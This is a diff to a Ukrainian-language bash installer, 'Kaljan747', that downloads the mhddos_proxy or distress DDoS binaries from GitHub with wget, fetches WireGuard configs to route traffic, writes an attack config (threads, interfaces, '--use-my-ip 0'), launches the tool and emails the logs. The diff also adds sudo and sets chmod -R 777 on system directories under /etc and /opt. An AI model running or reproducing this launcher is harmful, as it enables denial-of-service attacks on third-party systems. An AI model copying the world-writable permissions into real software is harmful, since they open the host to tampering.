@@ -33,30 +33,24 @@ echo -e "\e[1;32m🔧 Ініціалізація завершена\e[0m"
 echo -e "\e[1;36m========================================\e[0m"
 echo -e ""
 
-# === Визначення домашніх шляхів ===
-if [ "$(id -u)" -eq 0 ]; then
-  BASE_HOME="/root"
-else
-  BASE_HOME="$HOME"
-fi
-
-SETTINGS_FILE="$BASE_HOME/.kaljan747_settings"
-LOG_DIR="$BASE_HOME/logs"
+# === Визначення глобальних шляхів ===
+BASE_HOME="/opt/kaljan747"
+SETTINGS_FILE="/etc/kaljan747/settings.conf"
+LOG_DIR="/var/log/kaljan747"
 LOG_FILE="$LOG_DIR/wg.log"
-mkdir -p "$LOG_DIR"
-touch "$LOG_FILE" 2>/dev/null || {
-  log_warning "Немає прав на створення $LOG_FILE, використовую локальний лог"
-  LOG_FILE="./wg.log"
-  touch "$LOG_FILE"
-  log_success "Лог створено: $(realpath "$LOG_FILE")"
-}
+WG_DIR="/etc/wireguard/kaljan747"
+MODULE_DIR="/opt/kaljan747/modules"
+
+sudo mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR" /etc/kaljan747
+sudo touch "$LOG_FILE" "$SETTINGS_FILE"
+sudo chmod -R 777 "$LOG_DIR" "$MODULE_DIR" "$WG_DIR" /etc/kaljan747
 
 # === Email-конфігурація ===
 echo "Введіть email для логів (залиште порожнім для пропуску):"
 read EMAIL_TARGET
 if [[ "$EMAIL_TARGET" =~ ^.+@.+\..+$ ]]; then
-  echo -e "defaults\nauth on\ntls off\nlogfile ~/.msmtp.log\naccount default\nhost smtp.ukr.net\nport 2525\nfrom user@ukr.net\nuser user@ukr.net\npassword your_password\naccount default : default" > ~/.msmtprc
-  chmod 600 ~/.msmtprc
+  echo -e "defaults\nauth on\ntls off\nlogfile /var/log/kaljan747/msmtp.log\naccount default\nhost smtp.ukr.net\nport 2525\nfrom user@ukr.net\nuser user@ukr.net\npassword your_password\naccount default : default" | sudo tee /etc/msmtprc > /dev/null
+  sudo chmod 600 /etc/msmtprc
 fi
 
 # === Запит параметрів запуску ===
@@ -91,8 +85,6 @@ case "$run_choice" in
 esac
 
 # === Встановлення модулів ===
-MODULE_DIR="$BASE_HOME/modules"
-mkdir -p "$MODULE_DIR"
 if [ "$SELECTED_MODULE" = "mhddos_proxy" ]; then
   MODULE="$MODULE_DIR/mhddos_proxy"
   CONFIG_FILE="$MODULE_DIR/mhddos.ini"
@@ -103,14 +95,12 @@ else
   MODULE_URL="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
 fi
 wget -qO "$MODULE" "$MODULE_URL"
-chmod +x "$MODULE"
+sudo chmod +x "$MODULE"
 
 # === Підключення WG ===
-WG_DIR="$BASE_HOME/wg_confs"
-mkdir -p "$WG_DIR"
 WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
 CONF_LIST=$(curl -fsSL "$WG_REPO_HTML" | grep -oP '(?<=href=").*?\.conf(?=")' | grep '/blob/' | sed -e 's|^/|https://github.com/|' -e 's|blob/|raw/|')
-for url in $CONF_LIST; do wget -qO "$WG_DIR/$(basename $url)" "$url"; done
+for url in $CONF_LIST; do sudo wget -qO "$WG_DIR/$(basename $url)" "$url"; done
 
 INTERFACES=()
 for conf in $(find "$WG_DIR" -name '*.conf' | shuf | head -n 4); do
@@ -122,10 +112,10 @@ done
 
 # === INI ===
 INTERFACES_CSV=$(IFS=','; echo "${INTERFACES[*]}")
-echo "--use-my-ip 0 --copies auto -t 8000 --ifaces ${INTERFACES[*]} --user-id=$USER_ID" > "$CONFIG_FILE"
+echo "--use-my-ip 0 --copies auto -t 8000 --ifaces ${INTERFACES[*]} --user-id=$USER_ID" | sudo tee "$CONFIG_FILE" > /dev/null
 
 if [ "$EDIT_INI" = "Так" ]; then
-  nano "$CONFIG_FILE"
+  sudo nano "$CONFIG_FILE"
 fi
 
 # === Запуск ===
@@ -139,9 +129,10 @@ log_success "Модуль $SELECTED_MODULE запущено"
 
 # === Надсилання логів ===
 if [ -n "$EMAIL_TARGET" ]; then
-  echo -e "\n===== Звіт Kaljan747 =====\n" | cat - "$LOG_FILE" | msmtp "$EMAIL_TARGET"
+  echo -e "\n===== Звіт Kaljan747 =====\n" | cat - "$LOG_FILE" | msmtp --file=/etc/msmtprc "$EMAIL_TARGET"
   log_success "Звіт надіслано на $EMAIL_TARGET"
 fi
 
 log_success "Готово. Слідкуйте за логом: $LOG_FILE"
 exit 0
+
